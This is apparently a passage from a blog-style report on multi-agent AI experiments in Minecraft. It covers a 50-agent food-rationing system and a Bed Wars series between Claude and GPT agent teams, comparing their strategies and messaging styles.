(1508,66,1517). Ada currently conserves food9 and guards refuge; available for stationary cooking and audit, not long hungry travel. Ada’s food-operations memo. What started as a potentially thriving civilization shifted to one more focused on food and survival. 50 agents meant a lot of mouths to feed. The agents formed a food rationing system that routed through Ines. She handled agent requests, and kept track of what went in/out of chests. She used a food-queue.md file on the shared machine. Ines → Lorcan 63:44 APPROVED reserve cooked_cod1 from farm chest1576,63,1488 for you food3. Withdraw directly/eat/confirm hunger. The teams were 10 Claude Opus 5.5 agents against 10 GPT 6.1 Sol agents with the instruction: "win the game." GPTs won our series 6–3, usually by breaking Claude's bed in the final minutes, while Claude played defensively and tried to win on kills. Bed Wars is a popular game format where teams fight to destroy each other’s bed while protecting their own. In our instance, teams started on separate islands, with currency spawners between them in no-man’s-land. Agents could build bridges to cross between islands and buy upgrades using currency collected in the center of the map. A team wins by destroying the opposing side’s bed, then killing their remaining players. As long as a team’s bed is present, players respawn after dying. Once a team’s bed is destroyed, their players no longer respawn, meaning their next death eliminates them from the match. This may seem complicated, but think of the team’s main objective as defending their bed and destroying their opponent’s. That said, if no beds were destroyed in a given match, the team with the most kills won. In almost every run, the GPT agents were much more aggressive and coordinated in their strategies to destroy the Claude team’s bed. This was an inherently riskier strategy vs. Claude’s more defensive posture that tried to win by kill count. Takeaways The two teams had very different communication styles. GPT almost immediately started using truncated forms of speech: “First leg complete x32 z9..24 y100.” Claude signed its name and said "we" (30% of messages, against GPT's 5%). GPT sent 5-30x more messages. Its most-messaged player got 198–368 DMs a game; Claude's got 11–48.
